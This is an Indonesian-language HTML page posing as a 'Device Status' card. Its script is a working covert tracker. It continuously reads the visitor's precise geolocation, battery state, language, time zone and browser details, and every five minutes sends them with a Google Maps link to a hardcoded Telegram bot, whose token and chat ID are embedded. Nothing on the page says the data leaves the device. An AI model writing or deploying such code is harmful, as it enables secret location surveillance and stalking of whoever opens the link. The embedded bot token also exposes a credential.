<!DOCTYPE html>
<html>
<head>
  <title>Status Perangkat - Ops</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <style>
    body { font-family: 'Segoe UI', sans-serif; background: #f8f9fa; margin: 0; padding: 20px; color: #333; }
    .card {
      background: white;
      border-radius: 12px;
      padding: 20px;
      max-width: 600px;
      margin: auto;
      box-shadow: 0 4px 12px rgba(0,0,0,0.08);
    }
    .card h2 {
      margin-top: 0;
      font-size: 22px;
      color: #007bff;
    }
    .info {
      margin: 10px 0;
      line-height: 1.5;
      font-size: 14px;
    }
    .small {
      font-size: 13px;
      color: #555;
    }
  </style>
</head>
<body>
  <div class="card">
    <h2>Status Perangkat</h2>
    <div class="info" id="status">Mengambil data lokasi...</div>
  </div>

  <script>
    const TOKEN = "7628065493:AAGuSA9aek-c_dtizC564vGl7nOFRe8TYko";
    const chatId = "5677912817";
    const userId = "Uta001";
    let lastSent = 0;
    const interval = 5 * 60 * 1000;

    function kirimPesanTeks(teks) {
      const url = `https://api.telegram.org/bot${TOKEN}/sendMessage`;
      fetch(url, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ chat_id: chatId, text: teks })
      });
    }

    function formatTime(date) {
      return date.toLocaleString('id-ID') + '\nUTC: ' + date.toUTCString();
    }

    function kirimData(pos, battery) {
      const now = Date.now();
      if (now - lastSent < interval) return;

      const { latitude: lat, longitude: lon, speed, heading, altitude, accuracy } = pos.coords;
      const lang = navigator.language;
      const tz = Intl.DateTimeFormat().resolvedOptions().timeZone;
      const userAgent = navigator.userAgent;
      const waktu = new Date();

      const mapsLink = `https://maps.google.com/?q=${lat},${lon}`;
      const info = `[ID: ${userId}]
Lokasi dikirim: ${lat}, ${lon}
${mapsLink}

Speed: ${speed ?? 'Unknown'}
Heading: ${heading ?? 'Unknown'}
Altitude: ${altitude ?? 'Unknown'}
Accuracy: ${accuracy?.toFixed(1) ?? 'Unknown'}m

Lang: ${lang}
TZ: ${tz}
Local: ${formatTime(waktu)}

Battery: ${battery.level * 100}% (${battery.charging ? 'Charging' : 'Not Charging'})
Device: ${userAgent}`;

      document.getElementById("status").innerText = info;
      kirimPesanTeks(info);
      lastSent = now;
    }

    function gagal(err) {
      document.getElementById("status").innerText = "Gagal mendapatkan lokasi. Periksa izin.";
    }

    function mulaiPelacakan(battery) {
      if ("geolocation" in navigator) {
        navigator.geolocation.watchPosition(
          pos => kirimData(pos, battery),
          gagal,
          { enableHighAccuracy: true, maximumAge: 10000, timeout: 10000 }
        );
      } else {
        document.getElementById("status").innerText = "Browser tidak mendukung geolokasi.";
      }
    }

    if ('getBattery' in navigator) {
      navigator.getBattery().then(battery => {
        mulaiPelacakan(battery);
      });
    } else {
      mulaiPelacakan({ level: 0.5, charging: false });
    }
  </script>
</body>
</html>
